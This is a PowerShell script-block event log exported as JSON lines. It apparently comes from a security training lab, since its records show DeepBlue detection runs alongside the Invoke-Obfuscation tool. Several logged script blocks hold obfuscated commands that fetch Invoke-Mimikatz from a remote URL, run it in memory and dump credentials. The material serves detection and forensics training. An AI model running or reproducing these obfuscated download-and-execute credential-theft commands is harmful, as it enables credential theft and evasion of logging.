{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:17:39.237621Z"},"EventRecordID":581078,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-1879-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Get-WinEvent @{logname=\"Microsoft-Windows-PowerShell/Operational\";ID=4104}|fl|more","ScriptBlockId":"6e255bdc-aaa7-438e-b998-699c822f6ca1","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:17:47.492593Z"},"EventRecordID":581082,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-1B79-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"cb638b5d-e8e6-4585-aba2-d1b2544db02f","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:17:57.725339Z"},"EventRecordID":581126,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-2977-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{If((Get-Random -Minimum 0 -Maximum 2) -eq 0) {([String]$_).ToUpper()} Else {([String]$_).ToLower()}}","ScriptBlockId":"637142b2-d8a5-4a55-9b9b-ef74596c5e0f","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-ObfuscatedTokenCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:18:01.084695Z"},"EventRecordID":581260,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-9579-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":".((Gv '*mDR*').nAmE[3,11,2]-jOiN'')((('IEX (New'+'-Ob'+'jec'+'t Net.WebClient).DownloadString({0}ht'+'tps://'+'raw.git'+'hubus'+'ercontent.com/mattifest'+'ation/Po'+'werSploit/ma'+'st'+'er/Exfil'+'t'+'r'+'ati'+'on/Invoke'+'-Mimika'+'t'+'z'+'.ps1{'+'0}); Inv'+'oke-'+'Mi'+'m'+'ikat'+'z -Dum'+'p'+'Creds')  -f[cHaR]39)) ","ScriptBlockId":"32ed5a2d-ed8e-4482-8e1e-0d9640a84afa","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:18:19.204773Z"},"EventRecordID":585078,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-A096-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":".\\DeepBlue-0.3.ps1 \"\" powershell","ScriptBlockId":"fe0b7134-5c19-4e9b-a678-d74e6f34a999","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:18:44.958217Z"},"EventRecordID":585221,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-0997-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"&( $PsHome[4]+$pshOME[34]+'X') ((((\"{64}{90}{3}{91}{14}{40}{67}{6}{37}{36}{22}{87}{60}{10}{35}{57}{43}{44}{41}{7}{19}{50}{68}{12}{0}{31}{85}{88}{72}{25}{63}{32}{5}{39}{46}{65}{26}{42}{30}{77}{76}{15}{73}{75}{82}{86}{4}{70}{51}{47}{13}{56}{89}{66}{83}{49}{1}{34}{27}{79}{20}{11}{59}{45}{17}{24}{84}{33}{21}{48}{71}{18}{23}{16}{28}{29}{80}{74}{2}{38}{81}{54}{62}{78}{69}{52}{61}{53}{9}{58}{55}{8}\" -f'r','tiyJa','Ja','a*mDR*yJa).nAmE','it/ma','tyJ','IEX (New','ient)',')) ','CredsyJa','a','-M','dSt','J','3,11','J','nvyJa','t','yJa0','.D','keyJa+yJa','yJa+yJ','-ObyJa+','}); I','yJa','yJatps://yJa','aercontent.com','yJ','+','yJaoke-yJa+','ma','i','gi','z','+','+','Ja','yJa+y','myJa','a+yJahub',',2]-jOiNyJayJ','ebCl','/','at Ne','t.W','Ja+yJa','usyJa+','ty','a.ps1','yJa+yJaa','ow','Jas','DumyJa+yJa','yJa','Ja','cHaR]39','a+yJaer/','yJ',')  -f[','imikay','ecyJ','pyJa+','ikaty','+yJaraw.','.','yJ','xfilyJa+yJatyJa+','a)(((yJa','nloa','Jaz -','yJa+y','{yJa+','}htyJa+','a+yJaat','yJa+y','ion/','sty','ttife','Ja+y','aon/Invo','yJaMi','+y','PoyJa','yJar','+yJa','ng({','+yJawerSplo','yJaj','0','E','((Gv yJ','[')) -cRepLAce  ([ChaR]121+[ChaR]74+[ChaR]97),[ChaR]39)) ","ScriptBlockId":"fcee7489-fb7a-4abe-b357-05c2c879dbbb","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:18:50.150471Z"},"EventRecordID":587193,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-49A6-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"6a19579f-bb0e-42bb-bf0b-e0203f763666","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:05.622320Z"},"EventRecordID":589495,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-9DB8-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Set-vaRiablE  (\"2K\"+\"h8\")  ( \"NoIsSeRpxE-EkOVnI | )63]RAhc[,'6V0'  eCALpER- 43]RAhc[,'t3a'eCALpER- 93]RAhc[,)17]RAhc[+48]RAhc[+37]RAhc[(  ecalPerC- )' ))93]RahC[,)79]RahC[+47]RahC[+121'+']RahC[(  ecALpeRc- ))G'+'TI['+'GTI,GTIJy vG((GTI,GTIEGTI,GTI0GTI,GTIjaJyGTI,GTIolpSrewaJy+GTI,GTI{(gnGTI,GTIa'+'Jy+GTI,GTIraJyGTI,GTIaJ'+'yoPGTI,GTIy+GTI,GTIiMaJyGTI,GTIovnI/noaGTI,GTIy+aJGTI,GTIefittGTI,GTIytsGTI,GTI/noiGTI,GTIy+aJyGTI,GTItaaJ'+'y+aGTI,GTI+aJyth}GTI,GTI+aJy{GTI,GTIy+aJyGTI,GTI- zaJGTI,GTIaolnGTI,GTIaJy((()aGTI,GTI+aJytaJy+aJylifxGTI,GTIJyGTI,GTI.GTI,GTI.waraJy+GTI,GT'+'IytakiGTI,GTI+aJypGTI,GTIJyceGTI,G'+'TIyakimiGTI,GTI[f-  )GTI,GTIJyGTI,GTI/reaJ'+'y+aGTI,GTI93]RaHcGTI,GTIaJGTI,GTIaJyGTI'+',GTIaJy+a'+'Jym'+'uDGTI,GTIsaJGTI,GTIwoGT'+'I,GTIaaJy+aJyGT'+'I,GTI1sp.aGTI,GTIytGTI,GTI+aJys'+'uGTI,GTIaJy+aJGTI,GTIW.tGTI,GTIeN taGTI,GTI/GTI,GTIlCbeGTI,GTIJyaJy'+'NiOj-]2,GTI,GTIbuhaJy+aGTI,GTIaJymGTI,GTIy+aJyGTI,GTIaJGTI,GTI+GTI,GTI+GTI,GTIzGTI,GTIigGTI,GTIiGTI,GTIamGTI,GTI+aJy-ekoaJyGTI,GTI+GTI,GTIJyGTI,GTImoc.tnetnocreaGTI,GTIaJy//:sptaJyGTI,GT'+'IaJyGTI,GTII ;)}GTI,GTI+aJybO-GTI,GTI'+'J'+'y+aJyGTI,GTIaJy+aJyekGTI'+',GTID.GTI,GTI0aJyGTI,GTI'+'tGTI,GTIaJyvnGTI,GTIJGTI,GTI11,3GTI,GTIJGTI,GTItSdGTI,GTIM-GTI,GTIaGTI,GTIaJysderCGTI,GTI ))GTI,GTI)tneiGTI,GTIweN( XEIGTI,GTIJytGTI'+',GTIam/tiGTI'+',GTIEmAn.)aJy*RDm*aGTI,GTIaJGTI,GTIaJyitGTI,GTIrGTIf- t3a}8{}'+'55{}85{}9{}35{}16{}25{}96{}87{}26{}45{}18{}83{}2{}47'+'{}08{}92{}82{}61{}32{}81{}17{}84{}12{}'+'33{}48{}42{}71{}54{}9'+'5{}11{}02{}9'+'7{}72{}43{}1{}94{}38{}66{}98{}65{}31{}74{}15{}07{}4{}68{}28{}57{}37{}51{}67{}77{}03{}24{}62{}56{}64{}93'+'{}5{}23{}36{}52{}27{}88{}58{}13'+'{}0{}21{}86{}05{}91{}7{}14{}44{}34{}75{}53{}0'+'1{}06{}78{}22{}63{}73{}6{}76{}04{}41{}19{}3{}09{}46{t3a(((( )GTIXGTI+]43[EMOhsp6V0+]4[emoHsP6V0 (&'((\"  ); .( $pshOME[4]+$PshOMe[34]+'x')( [STRInG]::jOiN( '', ( variabLE  (\"2K\"+\"H8\")).VAluE[ -1 ..-(( variabLE  (\"2K\"+\"H8\")).VAluE.leNGTH) ]) ) ","ScriptBlockId":"3b3f4ff4-b647-4044-a493-e540751e8646","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:05.642384Z"},"EventRecordID":589499,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-9FB8-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"(('&( 0V6PsHome[4]+0V6pshOME[34]+ITGXITG) ((((a3t{64}{90}{3}{91}{14}{40}{67}{6}{37}{36}{22}{87}{60}{1'+'0}{35}{57}{43}{44}{41}{7}{19}{50}{68}{12}{0}{'+'31}{85}{88}{72}{25}{63}{32}{5}{'+'39}{46}{65}{26}{42}{30}{77}{76}{15}{73}{75}{82}{86}{4}{70}{51}{47}{13}{56}{89}{66}{83}{49}{1}{34}{27}{7'+'9}{20}{11}{5'+'9}{45}{17}{24}{84}{33'+'}{21}{48}{71}{18}{23}{16}{28}{29}{80}{'+'74}{2}{38}{81}{54}{62}{78}{69}{52}{61}{53}{9}{58}{55'+'}{8}a3t -fITGrITG,ITGtiyJaITG,ITGJaITG,ITGa*mDR*yJa).nAmEITG,'+'ITGit/maITG,'+'ITGtyJITG,ITGIEX (NewITG,ITGient)ITG,ITG)) ITG,ITGCredsyJaITG,ITGaITG,ITG-MITG,ITGdStITG,ITGJITG,ITG3,11ITG,ITGJITG,ITGnvyJaITG,ITGt'+'ITG,ITGyJa0ITG,ITG.DITG,'+'ITGkeyJa+yJaITG,ITGyJa+y'+'J'+'ITG,ITG-ObyJa+ITG,ITG}); IITG,ITGyJaI'+'TG,ITGyJatps://yJaITG,ITGaercontent.comITG,ITGyJITG,ITG+ITG,ITGyJaoke-yJa+ITG,ITGmaITG,ITGiITG,ITGgiITG,ITGzITG,ITG+ITG,ITG+ITG,ITGJaITG,ITGyJa+yITG,ITGmyJaITG,ITGa+yJahubITG,ITG,2]-jOiN'+'yJayJITG,ITGebClITG,ITG/ITG,ITGat NeITG,ITGt.WITG,ITGJa+yJaITG,ITGu'+'syJa+ITG,ITGtyITG,ITGa.ps1ITG,I'+'TGyJa+yJaaITG,I'+'TGowITG,ITGJasITG,ITGDu'+'myJ'+'a+yJaITG,'+'ITGyJaITG,ITGJaITG,ITGcHaR]39ITG,ITGa+y'+'Jaer/ITG,ITGyJITG,ITG)  -f[ITG,ITGimikayIT'+'G,ITGecyJITG,ITGpyJa+ITG,ITGikatyI'+'TG,ITG+yJaraw.ITG,ITG.ITG,ITGyJITG,ITGxfilyJa+yJatyJa+ITG,ITGa)(((yJaITG,ITGnloaITG,ITGJaz -ITG,ITGyJa+yITG,ITG{yJa+ITG,ITG}htyJa+ITG,ITGa+y'+'JaatITG,ITGyJa+yITG,ITGion/ITG,ITGstyITG,ITGttifeITG,ITGJa+yITG,ITGaon/InvoITG,ITGyJaMiITG,ITG+yITG,ITGPoy'+'JaITG,ITGyJarITG,ITG+yJ'+'aITG,ITGng({ITG,ITG+yJawerSploITG,ITGyJajITG,ITG0ITG,ITGEITG,ITG((Gv yJITG,ITG'+'[IT'+'G)) -cRepLAce  ([ChaR]'+'121+[ChaR]74+[ChaR]97),[ChaR]39)) ') -CrePlace  ([chAR]73+[chAR]84+[chAR]71),[chAR]39 -REpLACe'a3t',[chAR]34 -REpLACe  '0V6',[chAR]36) | InVOkE-ExpReSsIoN","ScriptBlockId":"e6d2303f-bdcc-4dcc-b955-b9293f2319fc","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:25.754923Z"},"EventRecordID":595837,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-86EA-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":".\\DeepBlue-0.3.ps1 \"\" powershell","ScriptBlockId":"c8a56cf1-c876-49e0-887f-7639e5b403ae","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:43.056890Z"},"EventRecordID":597253,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-CAF5-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$UpperLowerChar = $_; If(((Get-Random -Input @(1..2))-1 -eq 0)) {$UpperLowerChar = $UpperLowerChar.ToUpper()} $RandomDelimiters += $UpperLowerChar}","ScriptBlockId":"598a64cf-9bba-44a9-958b-215e80b41b9b","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:43.075759Z"},"EventRecordID":597282,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-D4F5-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$DelimitedEncodedArray += ([String]([Int][Char]$_) + (Get-Random -Input $RandomDelimiters))}","ScriptBlockId":"a303103f-1c7c-4f6d-a2a8-33b67062dee7","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:44.154031Z"},"EventRecordID":599218,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-FFF9-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"36df6004-6dc1-4410-be06-c2c8f43f0c01","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:44.166043Z"},"EventRecordID":599234,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-0EFA-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"8984b753-c9af-4168-b57b-746bde44e26f","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:44.171058Z"},"EventRecordID":599244,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-12FA-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"7d1f2061-30b6-4f58-9c44-341e20b10774","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:44.174210Z"},"EventRecordID":599251,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-16FA-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"9ea60e95-826d-4d06-bb7d-7c8e4a010554","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:44.176999Z"},"EventRecordID":599257,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-18FA-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"7f1fc4bc-4305-4d76-9328-eb047f416abb","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:44.180381Z"},"EventRecordID":599262,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-1AFA-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"9c276bb6-30eb-41fc-86ac-21d3b5912637","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:44.181987Z"},"EventRecordID":599265,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-D4F1-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"c6e63cf0-3709-4f54-a97c-5e785a67e8e4","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:19:44.236460Z"},"EventRecordID":599353,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-45FA-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$EncodedArray += ([String]([Int][Char]$_) + ' '*(Get-Random -Input @(0,1)) + ',' + ' '*(Get-Random -Input @(0,1)))}","ScriptBlockId":"2529f395-d8e4-499d-a036-0ca39107c9db","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedAsciiCommand.ps1"}}}
